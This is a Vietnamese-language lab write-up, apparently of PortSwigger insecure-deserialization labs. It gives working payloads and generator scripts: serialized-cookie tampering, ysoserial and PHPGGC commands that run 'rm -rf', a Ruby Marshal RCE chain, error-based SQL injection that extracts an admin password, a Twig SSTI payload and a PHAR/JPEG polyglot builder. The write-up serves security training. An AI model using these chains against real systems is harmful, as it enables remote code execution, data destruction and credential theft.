## Modifying serialized objects
Đây là challenge thay đổi thuộc tính trên serialized objects để leo quyền lên admin.

Đăng nhập bằng tài khoản wiener:peter, ta thấy session cookie là một object User sau khi được serialized và base64-encode. Để ý object User này có thuộc tính admin hiện có giá trị boolean 0 tức là false.
![image](https://hackmd.io/_uploads/BywMWsGYGe.png)
Do user này không phải admin → không vào được trang admin.
![image](https://hackmd.io/_uploads/S1bmbiftfg.png)
Tuy nhiên khi ta thay đổi serialized session cookie trên ở thuộc tính admin thành 1 → User lúc này là admin và ta vào được trang /admin.![image](https://hackmd.io/_uploads/S19mZsftMg.png)
Xóa user carlos

![image](https://hackmd.io/_uploads/HyENZsGtfl.png)
và ta solve được challenge.

![image](https://hackmd.io/_uploads/Hy64WjztGe.png)

## Modifying serialized data types

Tương tự bài trên, session cookie được serialized từ User object.
![image](https://hackmd.io/_uploads/By_UWsGYMe.png)
Lần này ứng dụng authenticate user thông qua thuộc tính access_token là chuỗi kí tự dài 32 kí tự.
`O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"t2blplwd06k5lr3coyxnjzy7ne355ge5";}
`
Tuy nhiên, theo mô tả có thể ứng dụng này sử dụng PHP loose comparison bởi operator == để authenticate như sau:
`$user = unserialize($_SESSION)
if ($user['access_token'] == $access_token) {
// Authenticate successfully
}
`
Như vậy ta sẽ bypass bằng cách chỉnh access_token về số nguyên 0 → bypass được == vì 0 == "string" sẽ trả về true. Serialized object sau khi chỉnh như sau:
`O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";i:0;}
`
Encode base64 và sử dụng session cookie mới này, ta thấy có chức năng Admin panel ở user hiện tại.![image](https://hackmd.io/_uploads/SJDYZiGtzx.png)
Thực hiện xóa carlos![image](https://hackmd.io/_uploads/ryZ9-jzFGg.png)
và ta solve được challenge.![image](https://hackmd.io/_uploads/H1K5WsftMx.png)

## Using application functionality to exploit insecure deserialization
Using application functionality to exploit insecure deserialization
`O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"bqp5e5wpdhhaz3rt0knb1u6uowozl5se";s:11:"avatar_link";s:19:"users/wiener/avatar";}
`
Tuy nhiên ứng dụng có chức năng Delete account.![image](https://hackmd.io/_uploads/rJr6ZsGYzl.png)
Như vậy, ta có thể tư duy rằng, khi Delete account, avatar của user cũng bị delete → nếu ta thay đổi đường dẫn tại thuộc tính avatar_link thành 1 file bất kì trong hệ thống thì file đó sẽ bị delete khỏi hệ thống khi Delete account.

Chỉnh sửa avatar_link thành chuỗi có 23 kí tự là đường dẫn ta cần xóa /home/carlos/morale.txt.
`O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"bqp5e5wpdhhaz3rt0knb1u6uowozl5se";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
`

Intercept chức năng Delete account và sửa session cookie như trên.![image](https://hackmd.io/_uploads/ryByfjftGl.png)

## Arbitrary object injection in PHP
Tương tự, ứng dụng chứa session cookie là 1 serialized User object.![image](https://hackmd.io/_uploads/S1agfifKMe.png)
Đọc mã nguồn HTML ta thấy có 1 đường dẫn thú vị /libs/CustomTemplate.php. Đây có thể là một class được định nghĩa trên server.![image](https://hackmd.io/_uploads/BkwWMifFGg.png)
Tất nhiên truy cập vào đường dẫn đó thì sẽ không có gì trả về.![image](https://hackmd.io/_uploads/BkWGfjzKGg.png)
Sử dụng trick thêm ~ vào cuối tên file, ta xem được mã nguồn file /libs/CustomTemplate.php. Đây có lẽ do lỗi config của server khi vẫn cho phép xem source code kiểu này khi public web.![image](https://hackmd.io/_uploads/HJ0MGszKGx.png)
Mã nguồn file /libs/CustomTemplate.php có nội dung như sau:
```
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>

```

Một class CustomTemplate được định nghĩa với 2 thuộc tính template_file_path và lock_file_path. Ta chỉ cần quan tâm magic method __destruct() khi nó thực hiện xóa file tại lock_file_path nếu nó tồn tại. Mặt khác __destruct() sẽ được gọi là server thực hiện deserialize.

→ Ta có thể tận dụng session cookie để thực hiện Object Injection như sau:
`O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
`

Server sẽ thực hiện deserialize CustomTemplate object trên → hàm __destruct() được kích hoạt → file /home/carlos/morale.txt bị xóa.

Gửi request với session cookie mới. Mặc dù server trả 500 vì invalid user nhưng payload trên đã được deserialize

![image](https://hackmd.io/_uploads/HJMSzjGKMe.png)

## Exploiting Java deserialization with Apache Commons

Ứng dụng sử dụng session cookie là 1 Java serialized object.
![image](https://hackmd.io/_uploads/rkgvfsGYMe.png)
Ở bài này ta sẽ thực hiện tấn công bằng cách tạo 1 gadget chain bằng tool ysoserial.

Đầu tiên ta sẽ kiểm tra xem ứng dụng có bi dính Insecure Deserialization tại session cookie không bằng chain URLDNS do chain này không phụ thuộc vào library ứng dụng sử dụng. Nếu như có DNS query đến collaborator thì chứng tỏ ta có thể khai thác.

Cú pháp tạo payload như sau:
`java -jar ysoserial.jar URLDNS <COLLABORATOR DOMAIN> 2> nul| base64 | sed ":a;N;$!ba;s/\n//g"
`
![image](https://hackmd.io/_uploads/SyRdzjfYMe.png)


Sử dụng payload vừa tạo vào session cookie và send request.![image](https://hackmd.io/_uploads/H1PqGsMKMl.png)
Kết quả thấy tại collaborator đã có DNS query gửi đến → Ứng dụng dính Insecure Deserialization tại session cookie.![image](https://hackmd.io/_uploads/HyziGizFze.png)
Do mô tả nói ứng dụng sử dụng thư viện Apache Commons Collections, nên ta sẽ tạo payload dựa vào các chain sẵn có của thư viện này: CommonsCollections1, CommonsCollections2, … Thử lần lượt các chain thì CommonsCollections4 thành công nên ta sẽ sử dụng nó ở các bước tiếp theo.

Để xóa file morale.txt, ta sử dụng cú pháp sau:
`java -jar ysoserial.jar CommonsCollections4 "rm -rf /home/carlos/morale.txt" 2> nul | base64 | sed ":a;N;$!ba;s/\n//g"
`

Sử dụng payload vừa tạo vào session cookie và send request.
![image](https://hackmd.io/_uploads/BJbaGjMYfg.png)
Mặc dù server trả lỗi 500 nhưng lệnh vẫn được thực thi và ta solve được challenge.


## Exploiting PHP deserialization with a pre-built gadget chain

Bài này tương tự bài trên nhưng sử dụng PHP. Và tool để tạo chain cho PHP ta sẽ sử dụng là PHPGGC.

Session cookie là 1 User serialized object. Trong đó, trường sig_hmac_sha1 chính là signature để verify User object tại trường token có bị thay đổi hay không.

![image](https://hackmd.io/_uploads/HJkkQsMKzg.png)

Khi ta sửa session cookie sai thì khi gửi request, server sẽ báo lỗi sai signature và có kèm theo version framework server sử dụng là Symfony 4.3.6.
![image](https://hackmd.io/_uploads/S1yxQiztGe.png)
Bây giờ ta sẽ đi generate gadget chain liên quan đến Symfony 4.3.6. Tuy nhiên, như đã nói server sẽ verify serialized object tại trường token bằng sig_hmac_sha1. Vậy nên sau khi tạo gadget chain payload thì cũng phải sign lại bằng secret key nào đó của server.
`{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJwZ3o0c2hxNGd2aGFzMXRkaXYyYWtnbWEwZWlhOGE4dSI7fQ==","sig_hmac_sha1":"b6d1c4717260044282ed0d2d5d648dca79bb5429"}
`

Đọc HTML source thì thấy có 1 đường dẫn Debug.![image](https://hackmd.io/_uploads/B14bQjztzg.png)
Truy cập thì đó là phpinfo và nó chứa cái ta cần tìm là SECRET_KEY.
![image](https://hackmd.io/_uploads/HkdzXjztfe.png)
Như vậy ta đã có SECRET_KEY. Ta sẽ đi tấn công thôi:
- Bước 1: Tạo gadget chain payload
- Có khá nhiều chain về Symfony, ta sẽ tìm các chain phù hợp với version 4.3.6.
- ![image](https://hackmd.io/_uploads/Sk4VXsMKMg.png)
Sử dụng chain Symfony/RCE4 với mục đích xóa file morale.txt bằng cú pháp sau:
`php ./phpggc Symfony/RCE4 system "rm -rf /home/carlos/morale.txt" | base64 | sed ":a;N;$!ba;s/\n//g"
`


![image](https://hackmd.io/_uploads/BJ_rmjMtMg.png)
- Bước 2: Sign payload vừa tạo với SECRET_KEY tìm được và tạo session cookie mới.
- Đoạn code exploit như sau:
```
<?php
$payload = "<generated_payload>";
$secret = "<phpinfo_secret_key>";
$sig_hmac_sha1 = hash_hmac("sha1", $payload, $secret);

$cookie = urlencode('{"token":"'.$payload.'","sig_hmac_sha1":"'.$sig_hmac_sha1.'"}');
print_r($cookie);
?>

```
Trong đó, hàm hash_hmac("sha1", $payload, $secret) được sử dụng để sign payload.

Thực thi đoạn code trên để lấy được session cookie mới.![image](https://hackmd.io/_uploads/H15w7oGFfe.png)
- Bước 3: Sử dụng session cookie mới và gửi request → Ta solve được challenge.
- ![image](https://hackmd.io/_uploads/B1SumszKfg.png)

## Exploiting Ruby deserialization using a documented gadget chain

Ứng dụng sử dụng session cookie là 1 serialized object.
![image](https://hackmd.io/_uploads/SJ1h7jMYzg.png
Sau khi decode và đọc 1 số byte đầu thì biết được đây là 1 serialized object của Ruby bằng module marshal.![image](https://hackmd.io/_uploads/rkN6XiftMx.png)
```


```
Ta tìm được 1 blog Universal Deserialisation Gadget for Ruby 2.x-3.x nói về lỗ hổng insecure deserialization dẫn đến RCE và kèm theo code generate gadget chain cho mình.

Đoạn code như sau:
```

# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])

require "base64"
puts Base64.encode64(payload)

```

Mình chỉ việc thay đổi lệnh cần thực thi, ở đây là rm /home/carlos/morale.txt. Thực thi file và in ra gadget chain dạng base64.
Thay đổi session cookie thành payload vừa tạo.
![image](https://hackmd.io/_uploads/BkJeEoftzl.png)

## Developing a custom gadget chain for Java deserialization
Ứng dụng sử dụng Java binary serialization format tại session cookie.
![image](https://hackmd.io/_uploads/Sy1wNozFfx.png)
Đọc source HTML thì chứa đường dẫn đến 1 folder backup.![image](https://hackmd.io/_uploads/HJFvEifKfl.png)
File AccessTokenUser.java không có gì đặc biệt.![image](https://hackmd.io/_uploads/B1FuEoMtGx.png)
Tuy nhiên khi truy cập folder /backup, ta thấy được thêm 1 file ProductTemplate.java định nghĩa class ProductTemplate.
![image](https://hackmd.io/_uploads/Bk_54jzFGx.png)
Nội dung source code như sau:
```
public ProductTemplate(String id)
    {
        this.id = id;
    }

private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException
    {
        inputStream.defaultReadObject();

        ...
            String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
        ...
    }

```
Cụ thể, constructor nhận id là tham số trực tiếp có thể bị control bởi attacker. Trong khi đó, hàm readObject() được định nghĩa để ghi đè hàm readObject() khi deserialize của Java. Bên cạnh defaultReadObject(), nó thực thi một câu lệnh sql bị dính SQLi thông qua biến id.

Dựa vào đó ta sẽ tạo 1 ProductTemplate serialized object chứa tham số id là SQLi payload. Ta sẽ tạo các file theo cấu trúc như sau:![image](https://hackmd.io/_uploads/HJ6a4jGKGl.png)
File tạo payload:
```
import data.productcatalog.ProductTemplate;
import java.io.FileOutputStream;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.Base64;

class Payload {
    public static void main(String[] args) {
        ProductTemplate prodTemplate = new ProductTemplate("<SQLI PAYLOAD>");
        String filename = "./file.ser";

        // Serialization
        try {
            // Saving of object in a file
            FileOutputStream file = new FileOutputStream(filename);
            ObjectOutputStream out = new ObjectOutputStream(file);
            
            // Method for serialization of object
            out.writeObject(prodTemplate);
            out.close();
            file.close();

            FileInputStream fileToRead = new FileInputStream(filename);
            byte[] fileBytes = fileToRead.readAllBytes();
            fileToRead.close();

            // Base64 encode the byte array
            String encoded = Base64.getEncoder().encodeToString(fileBytes);

            // Print the encoded string
            System.out.println(encoded);
        } catch (IOException ex) {
            System.out.println("IOException is caught");
            ex.printStackTrace();
        }
    }
}

```

Tiếp theo ta sẽ thực hiện SQLi attack thông qua tham số id thôi.
Xác định số cột
Sử dụng payload UNION-based để tìm số cột trả về.
`' UNION SELECT NULL -- 
`
Lúc này ta sẽ define instance ProductTemplate như sau:`ProductTemplate prodTemplate = new ProductTemplate("' UNION SELECT NULL -- ");
`

Truyển nó vào session cookie và gửi request. Ta thấy có error trả về của postgresql báo UNION phải cùng số cột với câu query trước → Ta đã có thể đảm bảo rằng ta có thể SQLi thành công.![image](https://hackmd.io/_uploads/B17QHofFzg.png)
Cứ tìm số cột cho đến khi UNION 8 cột:`' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL -- 
`
Error trả về khác → Query trả về 8 cột.![image](https://hackmd.io/_uploads/rk7SSjGtMl.png)
Ta sẽ đi tấn công Error Union-based SQLi.Trigger lỗi
Thử trả cột thứ dạng string,
`' UNION SELECT NULL, NULL, NULL, 'a', NULL, NULL, NULL, NULL -- 
`

thì server báo lỗi đó phải là integer → tận dụng CAST() để trả về nội dung các trường cần xem thông qua lỗi.
![image](https://hackmd.io/_uploads/ByzOriMYzg.png)
Xác định table
Ta đi xác định tên table bằng payload:
`' UNION SELECT NULL, NULL, NULL, CAST(table_name AS INTEGER), NULL, NULL, NULL, NULL FROM information_schema.tables -- 
`
Kết quả trả về có bảng users.![image](https://hackmd.io/_uploads/S1JqBsfKfl.png)
Xác định cột bảng users
`' UNION SELECT NULL, NULL, NULL, CAST(column_name AS INTEGER), NULL, NULL, NULL, NULL FROM information_schema.columns WHERE table_name='users' -- 
`
Kết quả trả về cột username.![image](https://hackmd.io/_uploads/HymnriGKzl.png)
Tìm cột khác username.
`' UNION SELECT NULL, NULL, NULL, CAST(column_name AS INTEGER), NULL, NULL, NULL, NULL FROM information_schema.columns WHERE table_name='users' AND column_name NOT IN ('username')-- 
`
Kết quả trả về cột ta cần tìm là password.
![image](https://hackmd.io/_uploads/Skf0BsMFze.png)
Xem username:
`' UNION SELECT NULL, NULL, NULL, CAST(username AS INTEGER), NULL, NULL, NULL, NULL FROM users -- 
`
Kết quả trả về administrator, chính user ta cần tìm.
![image](https://hackmd.io/_uploads/B1LeLjfYGg.png)
Bây giờ chỉ việc lấy password của adminstrator.
`' UNION SELECT NULL, NULL, NULL, CAST(password AS INTEGER), NULL, NULL, NULL, NULL FROM users WHERE username='administrator'-- 
`
Ta lấy được passwor qua error.
![image](https://hackmd.io/_uploads/HyobUifYfx.png)
Đăng nhập bằng tài khoản administrator tìm được và xóa user carlos để solve challenge.![image](https://hackmd.io/_uploads/rJUMUiMKfe.png)

## Developing a custom gadget chain for PHP deserialization

Tương tự, session cookie là 1 serialized User object.
![image](https://hackmd.io/_uploads/Hk-rUofKfg.png)
Đọc source HTML thì thấy 1 đường dẫn khá thú vị tại /cgi-bin/libs/CustomTemplate.php.![image](https://hackmd.io/_uploads/BkpB8sftfx.png)
Truy cập đường dẫn kèm theo trick ~ để ta xem được mã 
nguồn của file đó.
Nội dung file đó như sau:
```
<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}
?>

```
Đây là định nghĩa của class CustomTemplate kèm theo các class phụ khác. Ta sẽ phân tích như sau để tạo gadget chain:
Một DefaultMap object khi gọi đến một thuộc tính không tồn tại hay inaccessible thì __get($name) được gọi → call_user_func($callback, $name) được gọi.
Mặt khác, khi một serialized CustomTemplate object được deserialize:
- Hàm __wakeup() được gọi → Hàm build_product() được gọi
- Tại hàm build_product() khởi tạo một object Product($default_desc_type, $desc) → Hàm __construct() của class Product được gọi → $desc->$default_desc_type được gọi.
- Như vậy nếu như $desc là một DefaultMap object và $default_desc_type chính là tham số $name trong hàm __get(), thì $desc->$default_desc_type sẽ trở thành call_user_func($callback, $default_desc_type);
- Và khi đó, nếu callback là 1 hàm như eval hay exec, ta có thể thực thi lệnh OS với câu lệnh chính là $default_desc_type.
Dựa vào phân tích trên, ta tạo đoạn code generate payload như sau để xóa file /home/carlos/morale.txt:
```
<?php

class DefaultMap {
    public $callback;
}

class CustomTemplate {
    public $default_desc_type;
    public $desc;
}

$b = new DefaultMap();
$b->callback = "exec";

$a = new CustomTemplate();
$a->default_desc_type = "rm /home/carlos/morale.txt";
$a->desc = $b;

$payload = serialize($a);
print_r($payload);
?>

```

Thực thi đoạn code trên và ta có payload là 1 serialized CustomTemplate object.
`PS D:> php .\gen_payload.php
O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}
`
Encode base64 payload trên và gán vào session cookie. Gửi request,

## Using PHAR deserialization to deploy a custom gadget chain
Ứng dụng có chức năng cho user upload avatar, tuy nhiên chỉ ở định dạng jpg.
Upload thử file jpg và thấy đường dẫn xem avatar tại /cgi-bin/avatar.php?avatar=<username>.
Thử truy cập folder /cgi-bin thì thấy có 2 file mã nguồn định nghĩa 2 class CustomTemplate và Blog.
Truy cập /cgi-bin/Blog.php~ và ta xem được source code.
```
<?php

require_once('/usr/local/envs/php-twig-1.19/vendor/autoload.php');

class Blog {
    public $user;
    public $desc;
    private $twig;
    ...
    public function __toString() {
        return $this->twig->render('index', ['user' => $this->user]);
    }

    public function __wakeup() {
        $loader = new Twig_Loader_Array([
            'index' => $this->desc,
        ]);
        $this->twig = new Twig_Environment($loader);
    }

    ...
}

?>

```

Để ý qua một chút thì thấy server bị dính lỗi SSTI với template engine Twig ở $this->desc tại hàm __wakeup(). Như vậy ta có thể thấy được sink để rce tại đây bằng cách nhét SSTI payload vào $this->desc. Và để trigger được nó thì cần gọi hàm __toString() để render trang index.php chứa payload vừa được set ở hàm __wakeup(). (1)

Ngoài ra ta còn xem được source code của CustomTemplate.php:
```
<?php

class CustomTemplate {
    private $template_file_path;
    ...
    function __destruct() {
        // Carlos thought this would be a good idea
        @unlink($this->lockFilePath());
    }

    private function lockFilePath()
    {
        return 'templates/' . $this->template_file_path . '.lock';
    }
}

?>

```

Mã nguồn có magic method __destruct() sẽ thực hiện gọi hàm lockFilePath() để lấy tên file trước khi unlink(). Tuy nhiên nếu chú ý kĩ, nếu $this->template_file_path là 1 instance của class Blog thì __toString() của Blog sẽ được trigger. (2)

Kết hợp (1) và (2), ta tạo 1 CustomTemplate object với thuộc tính template_file_path là 1 instance Blog. Trong đó, $blog->desc sẽ là SSTI payload để xóa file morale.txt.
```
class CustomTemplate {}
class Blog {}
$object = new CustomTemplate;
$blog = new Blog;
$blog->desc = "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('rm /home/carlos/morale.txt')}}";
$blog->user = 'user';
$object->template_file_path = $blog;

```

Và vì server chỉ chấp jpg, nên ta sử dụng phương pháp phar jpg polygot với script như sau (Nguồn tại đây):
```
<?php


function generate_base_phar($o, $prefix){
    global $tempname;
    @unlink($tempname);
    $phar = new Phar($tempname);
    $phar->startBuffering();
    $phar->addFromString("test.txt", "test");
    $phar->setStub("$prefix<?php __HALT_COMPILER(); ?>");
    $phar->setMetadata($o);
    $phar->stopBuffering();
    
    $basecontent = file_get_contents($tempname);
    @unlink($tempname);
    return $basecontent;
}

function generate_polyglot($phar, $jpeg){
    $phar = substr($phar, 6); // remove <?php dosent work with prefix
    $len = strlen($phar) + 2; // fixed 
    $new = substr($jpeg, 0, 2) . "\xff\xfe" . chr(($len >> 8) & 0xff) . chr($len & 0xff) . $phar . substr($jpeg, 2);
    $contents = substr($new, 0, 148) . "        " . substr($new, 156);

    // calc tar checksum
    $chksum = 0;
    for ($i=0; $i<512; $i++){
        $chksum += ord(substr($contents, $i, 1));
    }
    // embed checksum
    $oct = sprintf("%07o", $chksum);
    $contents = substr($contents, 0, 148) . $oct . substr($contents, 155);
    return $contents;
}


// our payload
class CustomTemplate {}
class Blog {}
$object = new CustomTemplate;
$blog = new Blog;
$blog->desc = "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('rm /home/carlos/morale.txt')}}";
$blog->user = 'user';
$object->template_file_path = $blog;



// config for jpg
$tempname = 'temp.tar.phar'; // make it tar
$jpeg = file_get_contents('in.jpg');
$outfile = 'out.jpg';
$payload = $object;
$prefix = '';

var_dump(serialize($object));


// make jpg
file_put_contents($outfile, generate_polyglot(generate_base_phar($payload, $prefix), $jpeg));

/*
// config for gif
$prefix = "\x47\x49\x46\x38\x39\x61" . "\x2c\x01\x2c\x01"; // gif header, size 300 x 300
$tempname = 'temp.phar'; // make it phar
$outfile = 'out.gif';
// make gif
file_put_contents($outfile, generate_base_phar($payload, $prefix));
*/

```
Thực thi đoạn script trên. và nó generate cho mình 1 file jpg valid chứa file phar có metadata là serialized object payload.
Upload file và trigger Phar deserialization tại tham số avatar bằng phar://.Lúc này, metadata chứa payload đã được unserialize và thực thi → ta solve được challenge.